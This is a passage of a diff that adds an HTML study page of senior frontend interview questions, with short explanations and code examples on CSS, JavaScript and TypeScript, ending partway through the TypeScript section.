@@ -1,0 +1,3458 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Senior Frontend Engineer Interview Prep</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Fira+Code:wght@400;500&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #3b82f6;
+            --secondary-color: #10b981;
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --text-color: #e2e8f0;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --code-bg: #0d1117;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        /* Sidebar Navigation */
+        .sidebar {
+            width: 280px;
+            background-color: var(--card-bg);
+            border-right: 1px solid var(--border-color);
+            padding: 2rem 1rem;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            top: 0;
+            left: 0;
+            z-index: 100;
+        }
+
+        .sidebar h1 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            color: var(--primary-color);
+            text-align: center;
+        }
+
+        .nav-links {
+            list-style: none;
+        }
+
+        .nav-links li {
+            margin-bottom: 0.5rem;
+        }
+
+        .nav-links a {
+            display: block;
+            padding: 0.75rem 1rem;
+            color: var(--text-muted);
+            text-decoration: none;
+            border-radius: 0.5rem;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .nav-links a:hover,
+        .nav-links a.active {
+            background-color: rgba(59, 130, 246, 0.1);
+            color: var(--primary-color);
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-left: 280px;
+            padding: 3rem;
+            width: calc(100% - 280px);
+            max-width: 1200px;
+        }
+
+        .chapter {
+            margin-bottom: 4rem;
+            scroll-margin-top: 2rem;
+        }
+
+        .chapter-title {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid var(--border-color);
+            color: var(--secondary-color);
+        }
+
+        /* Question Card */
+        .question-card {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 1rem;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .question-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        }
+
+        .question-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 1.5rem;
+        }
+
+        .question-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--text-color);
+        }
+
+        .badge {
+            font-size: 0.75rem;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            background-color: var(--border-color);
+            color: var(--text-muted);
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .badge.basic {
+            background-color: rgba(16, 185, 129, 0.2);
+            color: #34d399;
+        }
+
+        .badge.intermediate {
+            background-color: rgba(59, 130, 246, 0.2);
+            color: #60a5fa;
+        }
+
+        .badge.advanced {
+            background-color: rgba(245, 158, 11, 0.2);
+            color: #fbbf24;
+        }
+
+        .section-label {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--text-muted);
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .simple-explanation {
+            background-color: rgba(59, 130, 246, 0.05);
+            border-left: 4px solid var(--primary-color);
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            border-radius: 0 0.5rem 0.5rem 0;
+        }
+
+        .detailed-answer {
+            color: var(--text-color);
+            margin-bottom: 1.5rem;
+        }
+
+        /* Code Blocks */
+        pre {
+            background-color: var(--code-bg);
+            padding: 1.5rem;
+            border-radius: 0.75rem;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            border: 1px solid var(--border-color);
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            color: #e2e8f0;
+        }
+
+        /* Syntax Highlighting Simulation */
+        .keyword {
+            color: #ff7b72;
+        }
+
+        .function {
+            color: #d2a8ff;
+        }
+
+        .string {
+            color: #a5d6ff;
+        }
+
+        .comment {
+            color: #8b949e;
+            font-style: italic;
+        }
+
+        .operator {
+            color: #79c0ff;
+        }
+
+        /* Back to Top */
+        .back-to-top {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background-color: var(--primary-color);
+            color: white;
+            width: 3rem;
+            height: 3rem;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            border: none;
+        }
+
+        .back-to-top.visible {
+            opacity: 1;
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                transform: translateX(-100%);
+                transition: transform 0.3s ease;
+            }
+
+            .sidebar.open {
+                transform: translateX(0);
+            }
+
+            .main-content {
+                margin-left: 0;
+                padding: 1.5rem;
+                width: 100%;
+            }
+
+            .mobile-menu-toggle {
+                display: block;
+                position: fixed;
+                top: 1rem;
+                right: 1rem;
+                z-index: 101;
+                background: var(--card-bg);
+                border: 1px solid var(--border-color);
+                padding: 0.5rem;
+                border-radius: 0.5rem;
+                color: var(--text-color);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Sidebar -->
+    <nav class="sidebar">
+        <h1>DevPrep</h1>
+        <ul class="nav-links">
+            <li><a href="#html-css">HTML & CSS</a></li>
+            <li><a href="#javascript">JavaScript</a></li>
+            <li><a href="#typescript">TypeScript</a></li>
+            <li><a href="#react">React</a></li>
+            <li><a href="#nextjs">Next.js</a></li>
+            <li><a href="#redux">Redux</a></li>
+            <li><a href="#browser-storage">Browser Storage & Security</a></li>
+            <li><a href="#performance">Performance</a></li>
+            <li><a href="#system-design">System Design</a></li>
+            <li><a href="#leadership">Leadership</a></li>
+        </ul>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+
+        <!-- HTML & CSS Section -->
+        <section id="html-css" class="chapter">
+            <h2 class="chapter-title">HTML & CSS</h2>
+            <!-- 1. Semantic HTML -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">9. What is the Critical Rendering Path?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    It's the sequence of steps the browser takes to convert HTML, CSS, and JS into actual pixels on the
+                    screen.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Optimizing the CRP is key to improving web performance (Core Web Vitals). The steps are:</p>
+                    <ol>
+                        <li><strong>DOM Construction:</strong> Parse HTML into the DOM tree.</li>
+                        <li><strong>CSSOM Construction:</strong> Parse CSS into the CSSOM tree.</li>
+                        <li><strong>Render Tree:</strong> Combine DOM and CSSOM. (Elements with
+                            <code>display: none</code> are excluded).</li>
+                        <li><strong>Layout (Reflow):</strong> Calculate geometry (position and size) of each node.</li>
+                        <li><strong>Paint:</strong> Fill in pixels (colors, borders, shadows).</li>
+                        <li><strong>Composite:</strong> Layering the painted parts together.</li>
+                    </ol>
+                </div>
+            </div>
+
+            <!-- 10. BEM -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">10. What is BEM and why use it?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    BEM stands for <strong>Block, Element, Modifier</strong>. It's a naming convention for CSS classes
+                    to make code reusable and maintainable.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>Block:</strong> Standalone entity (e.g., <code>.card</code>).</li>
+                        <li><strong>Element:</strong> Part of a block (e.g., <code>.card__title</code>).</li>
+                        <li><strong>Modifier:</strong> A flag on a block or element (e.g.,
+                            <code>.card--featured</code>).</li>
+                    </ul>
+                    <p>It prevents style leaks and specificity wars by keeping specificity low (mostly single class
+                        selectors).</p>
+                </div>
+                <pre><code>/* Block */
+.btn {}
+
+/* Element */
+.btn__icon {}
+
+/* Modifier */
+.btn--primary {}
+.btn--large {}</code></pre>
+            </div>
+
+            <!-- 11. Z-Index -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">11. How does z-index and Stacking Context work?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <code>z-index</code> decides which element is "on top". But it only works if the element has a
+                    <code>position</code> (relative/absolute/fixed).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p><strong>The Trap:</strong> A child with <code>z-index: 999</code> can still be behind a neighbor
+                        with <code>z-index: 1</code> if the child's <em>parent</em> has a lower z-index than the
+                        neighbor. This is called a Stacking Context.</p>
+                </div>
+                <div class="section-label">Code Example</div>
+                <pre><code>.parent-1 { z-index: 1; position: relative; }
+.child-999 { z-index: 999; position: absolute; }
+
+.parent-2 { z-index: 2; position: relative; }
+
+/* .child-999 will be BEHIND .parent-2 
+   because .parent-1 (z-index: 1) is below .parent-2 (z-index: 2). 
+   The child cannot escape its parent's level. */</code></pre>
+            </div>
+
+            <!-- 12. CSS Variables -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">12. What are CSS Custom Properties (Variables)?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Variables you can use directly in CSS. They are great for theming (Dark Mode).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>You define them with <code>--name</code> and use them with <code>var(--name)</code>. Unlike SASS
+                        variables, they can be updated by JavaScript at runtime.</p>
+                </div>
+                <div class="section-label">Code Example</div>
+                <pre><code>:root {
+  --primary: blue;
+}
+
+button {
+  background: var(--primary);
+}
+
+/* Dark Mode */
+body.dark {
+  --primary: lightblue; /* Automatically updates all buttons */
+}</code></pre>
+            </div>
+
+            <!-- 13. Accessibility (A11y) -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">13. What are ARIA roles and when should you use them?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Attributes that help screen readers understand custom controls. <strong>Rule #1:</strong> Don't use
+                    ARIA if a native HTML tag works.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Use them only when you are building complex widgets (like a custom dropdown or modal) that don't
+                        have a built-in HTML tag.</p>
+                </div>
+                <div class="section-label">Code Example</div>
+                <pre><code>&lt;!-- BAD: Re-inventing the wheel --&gt;
+&lt;div role="button" onclick="..."&gt;Click&lt;/div&gt;
+
+&lt;!-- GOOD: Using native element --&gt;
+&lt;button onclick="..."&gt;Click&lt;/button&gt;
+
+&lt;!-- GOOD: ARIA for custom widget --&gt;
+&lt;div role="dialog" aria-labelledby="modal-title"&gt;
+  &lt;h2 id="modal-title"&gt;Settings&lt;/h2&gt;
+&lt;/div&gt;</code></pre>
+            </div>
+
+            <!-- 14. CSS-in-JS -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">14. Pros and Cons of CSS-in-JS?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Writing CSS inside JavaScript files (e.g., Styled Components). It solves "global namespace" issues
+                    but adds file size.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p><strong>Pros:</strong> No class name clashes, easy dynamic styling based on props.<br>
+                        <strong>Cons:</strong> Slower performance (runtime parsing), larger JS bundle.
+                    </p>
+                </div>
+                <div class="section-label">Code Example</div>
+                <pre><code>// Styled Components Example
+const Button = styled.button`
+  background: ${props => props.primary ? 'blue' : 'gray'};
+  color: white;
+  padding: 10px;
+`;
+
+// Usage
+&lt;Button primary&gt;Click Me&lt;/Button&gt;</code></pre>
+            </div>
+
+            <!-- 15. Display: none vs Visibility: hidden -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">15. Difference between `display: none` and `visibility: hidden`?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>display: none</strong> removes it completely (no space). <strong>visibility: hidden</strong>
+                    makes it invisible but it still takes up space.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Use <code>display: none</code> to completely hide something. Use <code>visibility: hidden</code>
+                        if you want to keep the layout structure stable but hide the content.</p>
+                </div>
+                <div class="section-label">Code Example</div>
+                <pre><code>.removed {
+  display: none; /* Element is GONE. Layout shifts. */
+}
+
+.invisible {
+  visibility: hidden; /* Element is there, just transparent. No layout shift. */
+}</code></pre>
+            </div>
+
+            <!-- 16. Tailwind CSS -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">16. Why is Tailwind CSS so popular?</h3>
+                    <span class="badge intermediate">2025 Ready</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    It lets you style elements by adding classes like <code>flex</code>, <code>p-4</code>,
+                    <code>text-red-500</code> directly in HTML.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It speeds up development because you don't have to switch between HTML and CSS files or invent
+                        class names like <code>.sidebar-wrapper-inner</code>.</p>
+                </div>
+                <div class="section-label">Code Example</div>
+                <pre><code>&lt;!-- Traditional CSS --&gt;
+&lt;button class="btn-primary"&gt;Click&lt;/button&gt;
+
+&lt;!-- Tailwind CSS --&gt;
+&lt;button class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600"&gt;
+  Click
+&lt;/button&gt;</code></pre>
+            </div>
+
+            <!-- 17. Container Queries -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">17. What are CSS Container Queries?</h3>
+                    <span class="badge advanced">2025 Ready</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Like Media Queries, but they check the size of the <strong>parent container</strong>, not the whole
+                    screen.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>This makes components truly reusable. A "Card" component can look one way in a wide sidebar and
+                        another way in a narrow column, regardless of the screen size.</p>
+                </div>
+                <div class="section-label">Code Example</div>
+                <pre><code>.parent {
+  container-type: inline-size;
+}
+
+.child {
+  /* Default style */
+  font-size: 1rem;
+}
+
+@container (min-width: 500px) {
+  .child {
+    /* Style when PARENT is wider than 500px */
+    font-size: 2rem;
+  }
+}</code></pre>
+            </div>
+        </section>
+
+        <!-- JavaScript Section -->
+        <section id="javascript" class="chapter">
+            <h3 class="question-title">9. Explain Prototypal Inheritance.</h3>
+            <span class="badge advanced">Advanced</span>
+            </div>
+            <div class="section-label">Simple Explanation</div>
+            <div class="simple-explanation">
+                Objects in JavaScript have a link to a prototype object. When trying to access a property, JS checks the
+                object first, then its prototype, and so on (Prototype Chain).
+            </div>
+            <div class="section-label">Detailed Answer</div>
+            <div class="detailed-answer">
+                <p>Every function has a <code>prototype</code> property. When you create an object using
+                    <code>new Func()</code>, the object's internal <code>[[Prototype]]</code> (exposed as
+                    <code>__proto__</code>) is linked to <code>Func.prototype</code>.</p>
+                <p>ES6 Classes are syntactic sugar over this system.</p>
+            </div>
+            </div>
+
+            <!-- 10. ES6 Features -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">10. Key features introduced in ES6?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    ES6 (ECMAScript 2015) was a major update. Key features include `let`/`const`, Arrow Functions,
+                    Template Literals, Destructuring, and Classes.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>Block Scoping:</strong> `let` and `const`.</li>
+                        <li><strong>Arrow Functions:</strong> Concise syntax and lexical `this`.</li>
+                        <li><strong>Template Literals:</strong> String interpolation with backticks.</li>
+                        <li><strong>Destructuring:</strong> Extracting values from arrays/objects easily.</li>
+                        <li><strong>Default Parameters:</strong> `function(a = 1)`.</li>
+                        <li><strong>Spread/Rest Operator:</strong> `...args`.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- 11. Map vs Filter vs Reduce -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">11. Explain map(), filter(), and reduce().</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Higher-order array methods. `map` transforms, `filter` selects, and `reduce` accumulates.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>map:</strong> Returns a new array with the same length, where each element is
+                            transformed.</li>
+                        <li><strong>filter:</strong> Returns a new array with only elements that pass the condition.
+                        </li>
+                        <li><strong>reduce:</strong> Reduces the array to a single value (e.g., sum, object) based on an
+                            accumulator.</li>
+                    </ul>
+                </div>
+                <pre><code>const nums = [1, 2, 3, 4];
+const sum = nums.reduce((acc, curr) => acc + curr, 0); // 10</code></pre>
+            </div>
+
+            <!-- 12. Event Bubbling vs Capturing -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">12. What is Event Bubbling and Capturing?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    They describe the order in which event handlers are called when an event occurs on an element nested
+                    inside other elements.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p><strong>Capturing Phase (Trickling):</strong> The event goes down from the window to the target
+                        element.</p>
+                    <p><strong>Target Phase:</strong> The event reaches the target.</p>
+                    <p><strong>Bubbling Phase:</strong> The event bubbles up from the target to the window.</p>
+                    <p>By default, event listeners trigger in the <em>Bubbling</em> phase. Use
+                        <code>addEventListener(type, listener, true)</code> to listen in the Capturing phase.</p>
+                </div>
+            </div>
+
+            <!-- 13. Debounce vs Throttle -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">13. Difference between Debounce and Throttle?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Techniques to limit the rate at which a function is executed.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p><strong>Debounce:</strong> Ensures that a function is not called until a certain amount of time
+                        has passed since the <em>last</em> time it was invoked. (e.g., "Search as you type" - wait until
+                        user stops typing).</p>
+                    <p><strong>Throttle:</strong> Ensures that a function is called at most once in a specified time
+                        period. (e.g., "Scroll event" - update only every 100ms).</p>
+                </div>
+            </div>
+
+            <!-- 14. Deep vs Shallow Copy -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">14. Difference between Shallow and Deep Copy?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A shallow copy copies the object's top-level properties. Nested objects are copied as references. A
+                    deep copy duplicates everything, including nested objects.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p><strong>Shallow Copy Methods:</strong> <code>Object.assign({}, obj)</code>, Spread operator
+                        <code>{...obj}</code>.</p>
+                    <p><strong>Deep Copy Methods:</strong> <code>JSON.parse(JSON.stringify(obj))</code> (has limitations
+                        with functions/undefined), or <code>structuredClone(obj)</code> (modern standard).</p>
+                </div>
+            </div>
+
+            <!-- 15. == vs === -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">15. Difference between `==` and `===`?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    `==` (Loose Equality) performs type coercion before comparison. `===` (Strict Equality) compares
+                    both value and type without coercion.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Always use <code>===</code> to avoid unexpected bugs caused by implicit type conversion.</p>
+                </div>
+                <pre><code>5 == "5"  // true
+5 === "5" // false
+null == undefined // true
+null === undefined // false</code></pre>
+            </div>
+
+            <!-- 16. Null vs Undefined -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">16. Difference between `null` and `undefined`?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    `undefined` means a variable has been declared but not assigned a value. `null` is an assignment
+                    value that represents "no value" or "empty".
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p><code>typeof undefined</code> is "undefined". <code>typeof null</code> is "object" (a historical
+                        bug in JS).</p>
+                </div>
+            </div>
+
+            <!-- 17. Currying -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">17. What is Currying?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Currying is the process of converting a function that takes multiple arguments into a sequence of
+                    functions that each take a single argument.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It helps in creating higher-order functions and partial application.</p>
+                </div>
+                <pre><code>// Normal
+function add(a, b) { return a + b; }
+
+// Curried
+function curriedAdd(a) {
+  return function(b) {
+    return a + b;
+  };
+}
+curriedAdd(5)(10); // 15</code></pre>
+            </div>
+
+            <!-- 18. Generators -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">18. What are Generators?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Functions that can be paused and resumed. They are declared with `function*` and use `yield` to
+                    return values one by one.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>When called, a generator returns an iterator object. You call <code>.next()</code> on the
+                        iterator to execute code until the next <code>yield</code>.</p>
+                </div>
+            </div>
+
+            <!-- 19. Storage -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">19. LocalStorage vs SessionStorage vs Cookies?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Different ways to store data on the client-side.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><strong>LocalStorage:</strong> Persists even after the browser is closed. Stores about
+                            5-10MB.</li>
+                        <li><strong>SessionStorage:</strong> Persists only for the session (until the tab is closed).
+                            Stores about 5MB.</li>
+                        <li><strong>Cookies:</strong> Sent to the server with every HTTP request. Used for
+                            authentication. Stores 4KB.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- 20. DOM Manipulation -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">20. How to select elements in the DOM?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Using methods like `getElementById`, `querySelector`, etc.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <ul>
+                        <li><code>document.getElementById('id')</code>: Fast, selects one element.</li>
+                        <li><code>document.querySelector('.class')</code>: Selects the <em>first</em> match (CSS
+                            selector syntax).</li>
+                        <li><code>document.querySelectorAll('div')</code>: Selects <em>all</em> matches (returns
+                            NodeList).</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- 21. Memory Leaks -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">21. Common causes of Memory Leaks in JS?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Memory leaks happen when the application holds references to objects that are no longer needed,
+                    preventing the Garbage Collector from freeing up memory.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Common causes:</p>
+                    <ul>
+                        <li><strong>Global variables:</strong> Accidentally creating globals.</li>
+                        <li><strong>Closures:</strong> Holding references to large scopes unnecessarily.</li>
+                        <li><strong>Event Listeners:</strong> Forgetting to remove listeners on unmount (especially in
+                            SPA).</li>
+                        <li><strong>Timers:</strong> Uncleared `setInterval`.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- 22. Service Workers -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">22. What are Service Workers?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Scripts that run in the background, separate from the web page. They enable features like Offline
+                    support (PWA), Push Notifications, and Background Sync.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>They act as a proxy between the web app and the network. They can intercept network requests and
+                        serve cached responses.</p>
+                </div>
+            </div>
+
+            <!-- 23. Web Workers -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">23. What are Web Workers?</h3>
+                    <span class="badge advanced">Advanced</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    Web Workers allow you to run JavaScript code in the background, on a separate thread, to avoid
+                    blocking the main UI thread.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Useful for heavy computations (image processing, large data sorting) that would otherwise freeze
+                        the interface.</p>
+                </div>
+            </div>
+
+            <!-- 24. Strict Mode -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">24. What is "use strict"?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    A directive that enforces stricter parsing and error handling in JavaScript code.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>It prevents common mistakes like using undeclared variables, duplicate parameter names, and using
+                        reserved keywords.</p>
+                </div>
+            </div>
+
+            <!-- 25. Modules -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">25. CommonJS vs ES Modules?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>CommonJS:</strong> Node.js standard (<code>require</code>). <strong>ES Modules:</strong> Web
+                    standard (<code>import</code>).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>ES Modules are statically analyzable (allowing Tree Shaking) and asynchronous. CommonJS is
+                        dynamic and synchronous.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// CommonJS (Node.js)
+const fs = require('fs');
+module.exports = function() {};
+
+// ES Modules (Modern Web)
+import fs from 'fs';
+export default function() {};</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- TypeScript Section -->
+        <section id="typescript" class="chapter">
+            <h2 class="chapter-title">TypeScript</h2>
+
+            <!-- 1. Interface vs Type -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">1. Difference between Interface and Type?</h3>
+                    <span class="badge basic">Basic</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    <strong>Interfaces</strong> are for defining object shapes and support declaration merging.
+                    <strong>Types</strong> are more flexible (unions, primitives, intersections).
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Use <code>interface</code> for public API definitions (libraries) as they are cleaner and
+                        extendable. Use <code>type</code> for complex type compositions like unions or when you need to
+                        define a primitive alias.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>// Interface (Open to extension)
+interface User {
+  name: string;
+}
+interface User { // Declaration Merging
+  age: number;
+}
+
+// Type (Flexible)
+type ID = string | number; // Union
+type UserState = 'active' | 'inactive';</code></pre>
+                </div>
+            </div>
+
+            <!-- 2. Generics -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">2. What are Generics?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
+                    "Variables" for types. They allow you to create reusable components that work with a variety of
+                    types while maintaining type safety.
+                </div>
+                <div class="section-label">Detailed Answer</div>
+                <div class="detailed-answer">
+                    <p>Generics capture the type provided by the user (e.g., <code>&lt;T&gt;</code>) so it can be used
+                        later in the function signature or class. This avoids using <code>any</code> and losing type
+                        information.</p>
+                </div>
+                <div class="code-example">
+                    <pre><code>function identity&lt;T&gt;(arg: T): T {
+  return arg;
+}
+
+const num = identity(42); // T is inferred as number
+const str = identity("Hello"); // T is inferred as string</code></pre>
+                </div>
+            </div>
+
+            <!-- 3. any vs unknown -->
+            <div class="question-card">
+                <div class="question-header">
+                    <h3 class="question-title">3. `any` vs `unknown`?</h3>
+                    <span class="badge intermediate">Intermediate</span>
+                </div>
+                <div class="section-label">Simple Explanation</div>
+                <div class="simple-explanation">
